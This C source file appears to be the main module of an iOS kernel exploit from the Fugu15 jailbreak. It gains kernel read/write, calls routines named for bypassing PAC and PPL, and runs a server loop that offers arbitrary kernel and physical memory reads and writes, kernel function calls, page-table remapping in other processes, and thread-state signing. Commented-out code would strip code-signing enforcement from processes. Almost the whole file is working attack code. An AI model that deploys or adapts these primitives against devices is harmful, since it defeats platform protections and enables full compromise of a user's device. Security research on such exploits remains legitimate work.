//
//  main.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdio.h>
#include <sys/errno.h>
#include <IOKit/IOKitLib.h>
#include <stdbool.h>

#include "includeme.h"
#include "oobPCI.h"
#include "offsets.h"
#include "physrw.h"
#include "kernrw_alloc.h"
#include "badRecovery.h"
#include "tlbFail.h"
#include "kernel.h"
#include "xprr.h"
#include "virtrw.h"
#include "Fugu15KRW.h"

#define TF_PLATFORM 0x400

#define CS_HARD            0x00000100  /* don't load invalid pages */
#define CS_KILL            0x00000200  /* kill process if it becomes invalid */
#define CS_RESTRICT        0x00000800  /* tell dyld to treat restricted */
#define CS_ENFORCEMENT     0x00001000  /* require enforcement */
#define CS_REQUIRE_LV      0x00002000  /* require library validation */
#define CS_PLATFORM_BINARY 0x04000000  /* this is a platform binary */

#define FAKE_PHYSPAGE_TO_MAP 0x13370000
#define PPL_MAP_ADDR         0x2000000 // This is essentially guaranteed to be unused, minimum address is usually 0x100000000

extern void mach_init(void);

uint64_t procForPID(pid_t pid) {
    uint64_t curProc = kread64(SLIDE(gOffsets.allproc));
    while (curProc) {
        if (PROC_PID(curProc) == pid) {
            return curProc;
        }
        
        curProc = PROC_NEXT(curProc);
    }
    
    return 0;
}

bool platformize(uint64_t proc) {
    uint64_t task = PROC_TASK(proc);
    guard (task != 0) else {
        puts("[-] platformize: Failed to get task!");
        return false;
    }
    
    uint32_t flags = TASK_FLAGS(task) | TF_PLATFORM;
    TASK_FLAGS_SET(task, flags);
    
    uint64_t proc_ro = PROC_RO(proc);
    guard (proc_ro != 0) else {
        puts("[-] platformize: Failed to get proc_ro!");
        return false;
    }
    
    flags = PROC_RO_CSFLAGS(proc_ro) | CS_PLATFORM_BINARY;
    flags &= ~(CS_HARD | CS_KILL | CS_RESTRICT | CS_ENFORCEMENT | CS_REQUIRE_LV);
    PROC_RO_CSFLAGS_SET(proc_ro, flags);
    
    return true;
}

void terminateService(mach_port_t service) {
    uint64_t ourService = portKObject(service);
    uint64_t ourServiceVTable = kread_ptr(ourService);
    guard (ourServiceVTable != 0) else {
        puts("Failed to read our service VTable!");
        exit(-1);
    }
    
    uint64_t terminateFunc = kread_ptr(ourServiceVTable + 0x2F8);
    guard (terminateFunc != 0) else {
        puts("Failed to get terminate func!");
        exit(-1);
    }
    
    //kcall(terminateFunc, ourService, 0x103, 0, 0, 0, 0, 0, 0);
    kcall(terminateFunc, ourService, 0, 0, 0, 0, 0, 0, 0);
}

void PCIDevice_setBusMasterAndMemoryAccessEnable(mach_port_t port, bool enable)
{
    uint64_t PCIDevice = portKObject(port);
    uint64_t PCIDevice_Vtable = kread_ptr(PCIDevice);
    guard (PCIDevice_Vtable != 0) else {
        puts("Failed to read PCIDevice VTable!");
        exit(-1);
    }

    uint64_t toSet = 0;
    if (enable) toSet = 6;

    uint64_t setConfigBitsFunc = kread_ptr(PCIDevice_Vtable + 0x580);
    guard (setConfigBitsFunc != 0) else {
        puts("Failed to get setConfigBits func!");
        exit(-1);
    }

    printf("setConfigBits (%p) (%p, %p)\n", (void*)setConfigBitsFunc, (void*)PCIDevice, (void*)toSet);
    uint64_t ret = kcall(setConfigBitsFunc, PCIDevice, 4, 6, toSet, 0, 0, 0, 0);
    printf("=> %p\n", (void*)ret);
}

void unlabelPort(mach_port_t port) {
    uint64_t kPort = portGetKPort(port);
    guard (kPort != 0) else {
        puts("unlabelPort: Failed to get kPort!");
        exit(-1);
    }
    
    uint64_t label = PORT_LABEL(kPort);
    guard (label != 0) else {
        puts("unlabelPort: Failed to get label!");
        exit(-1);
    }
    
    LABEL_SET_LABEL_VALUE(label, 0);
}

void __attribute__((noreturn)) exploit_server(uint64_t kBase, uint64_t virtBase, uint64_t physBase) {
    status_update("Patchfinding");
    resolveKernelOffsets(kBase);
    
    /*unlabelPort(gDKServerPort);
    unlabelPort(gIOPCIDev);
    
    void (*krwDone)(mach_port_t, mach_port_t) = (void(*)(mach_port_t, mach_port_t)) DBG_EXPLOIT_FUNC(5);
    krwDone(gDKServerPort, gIOPCIDev);*/
    
    buildPhysPrimitive(kBase);
    status_update("Bypassing PAC");
    breakCFI(kBase);
    setupFugu14Kcall();
    status_update("Bypassing PPL");
    pplBypass(); // Requires Fugu14 kcall to be available
    
    // This will prevent the kernel from panic'ing when we exit
    // The Fugu14 PAC bypass will not be deinited
    deinitFugu15PACBypass();

    PCIDevice_setBusMasterAndMemoryAccessEnable(gIOPCIDev, true);
    
    // Fix PM Bug
    // FIXME: Doesn't work unless this application exits
    //terminateService(gDKServerPort);
    //terminateService(gDKOrigServerPort);
    
    // Platformize us...
    /*platformize(gOurProc);
    
    // ...and our parent
    uint64_t parentProc = procForPID(getppid());
    if (parentProc != 0 && parentProc != gKernelProc) {
        platformize(parentProc);
    }*/
    
    vm_address_t bufAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self_, &bufAddr, 0x4000, VM_FLAGS_ANYWHERE);
    guard (kr == KERN_SUCCESS) else {
        printf("vm_allocate failed! [%x]\n", kr);
        exit(-1);
    }
    
    void (*notifyParent)(uint64_t, uint64_t, uint64_t) = (void (*)(uint64_t, uint64_t, uint64_t)) DBG_DK_FUNC_NOTIFY;
    notifyParent(kBase, virtBase, physBase);
    
    uint64_t (*getRequest)(uint64_t *addr, size_t *size, void *buf)                = (uint64_t (*)(uint64_t *, size_t *, void *)) DBG_GET_REQUEST;
    void (*sendReply)(uint64_t status, uint64_t result, void *buf, size_t bufSize) = (void (*)(uint64_t, uint64_t, void *, size_t)) DBG_SEND_REPLY;
    void (*writeBootInfo)(uint64_t nameIndex, uint64_t value) = (void(*)(uint64_t, uint64_t)) DBG_WRITE_BOOT_INFO_UINT64;

    // Allocate pages for all processes that need kcall primitives
    uint64_t jailbreakd_pac_allocation = kcall(SLIDE(gOffsets.kalloc_data_external), 0x4000 * 4, 0, 0, 0, 0, 0, 0, 0);
    uint64_t launchd_pac_allocation = kcall(SLIDE(gOffsets.kalloc_data_external), 0x4000 * 4, 0, 0, 0, 0, 0, 0, 0);
    uint64_t boomerang_pac_allocation = kcall(SLIDE(gOffsets.kalloc_data_external), 0x4000 * 4, 0, 0, 0, 0, 0, 0, 0);
    writeBootInfo(1, jailbreakd_pac_allocation);
    writeBootInfo(2, launchd_pac_allocation);
    writeBootInfo(3, boomerang_pac_allocation);
    
    uint64_t addr    = 0;
    size_t   size    = 0;
    uint64_t result  = 0;
    uint64_t status  = -1;
    size_t   bufSize = 0;
    while (1) {
        result  = 0;
        status  = 0;
        bufSize = 0;
        
        uint64_t request = getRequest(&addr, &size, (void*) bufAddr);
        switch (request) {
            case 0:
                // Kread, virtual
                if (size <= 0x4000) {
                    if (kernread(addr, size, (void*) bufAddr)) {
                        bufSize = size;
                    } else {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to read!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot read more than 0x4000 bytes!");
                }
                
                break;
                
            case 1:
                // Kread, physical
                if (size <= 0x4000) {
                    if (physread(addr, size, (void*) bufAddr)) {
                        bufSize = size;
                    } else {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to read!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot read more than 0x4000 bytes!");
                }
                
                break;
                
            case 2:
                // Kwrite, virtual
                if (size <= 0x4000) {
                    if (!kernwrite(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 3:
                // Kwrite, physical
                if (size <= 0x4000) {
                    if (!physwrite(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 4:
                // Kwrite, PPL, virtual
                if (size <= 0x4000) {
                    if (!kernwrite_PPL(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 5:
                // Kwrite, PPL, physical
                if (size <= 0x4000) {
                    if (!physwrite_PPL(addr, (void*) bufAddr, size)) {
                        status = -1;
                        strcpy((char*) bufAddr, "Failed to write!");
                    }
                } else {
                    status = -1;
                    strcpy((char*) bufAddr, "Cannot write more than 0x4000 bytes!");
                }
                
                break;
                
            case 6: {
                // Kcall
                uint64_t *args = (uint64_t*) bufAddr;
                result = kcall(addr, args[0], args[1], args[2], args[3], args[4], args[5], args[6], args[7]);
                
                break;
            }
                
            case 7: {
                // Argument is a PID, init PPL bypass in that process
                uint64_t proc = procForPID((pid_t) addr);
                guard (proc != 0) else {
                    status = -2;
                    break;
                }
                
                uint64_t task = PROC_TASK(proc);
                guard (task != 0) else {
                    status = -3;
                    break;
                }
                
                uint64_t vmMap = TASK_VM_MAP(task);
                guard (vmMap != 0) else {
                    status = -4;
                    break;
                }
                
                uint64_t pmap = VM_MAP_PMAP(vmMap);
                guard (pmap != 0) else {
                    status = -5;
                    break;
                }
                
                // Map the fake page
                kern_return_t kr = pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, PPL_MAP_ADDR);
                guard (kr == KERN_SUCCESS) else {
                    status = -6;
                    break;
                }
                
                // Temporarily change pmap type to nested
                PMAP_TYPE_SET(pmap, 3);
                
                // Remove mapping (table will not be removed because we changed the pmap type)
                pmap_remove(pmap, PPL_MAP_ADDR, PPL_MAP_ADDR + 0x4000);
                
                // Change type back
                PMAP_TYPE_SET(pmap, 0);
                
                // Change the mapping to map the underlying page table
                uint64_t table2Entry = pmap_lv2(pmap, PPL_MAP_ADDR);
                guard ((table2Entry & 0x3) == 0x3) else {
                    status = -7;
                    break;
                }
                
                uint64_t table3 = table2Entry & 0xFFFFFFFFC000ULL;
                uint64_t pte = table3 | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
                guard (physwrite_PPL(table3, &pte, sizeof(uint64_t))) else {
                    status = -8;
                    break;
                }
                
                result = PPL_MAP_ADDR;
                
                break;
            }
            
            case 8: {
                // Argument is a thread state, sign it
                kRegisterState state;
                guard (kernread(addr, sizeof(kRegisterState), &state)) else {
                    status = -2;
                    break;
                }
                
                kcall(SLIDE(gOffsets.ml_sign_thread_state), addr, state.pc, state.cpsr, state.lr, state.x[16], state.x[17], 0, 0);
                
                break;
            }
                
            default:
                status = -1;
                strcpy((char*) bufAddr, "Bad request!");
                
                break;
        }
        
        if (status != 0 && bufSize == 0) {
            bufSize = strlen((char*) bufAddr);
        }
        
        sendReply(status, result, (void*) bufAddr, bufSize);
    }
}

int main(int argc, const char * argv[]) {
    mach_init();
    
    status_update("Gaining r/w");
    
    uint64_t kBase = 0, virtBase = 0, physBase = 0;
    guard (oobPCI_init(&kBase, &virtBase, &physBase)) else {
        puts("[-] oobPCI failed!");
        return -1;
    }
    
    exploit_server(kBase, virtBase, physBase);
    
    return 0;
}
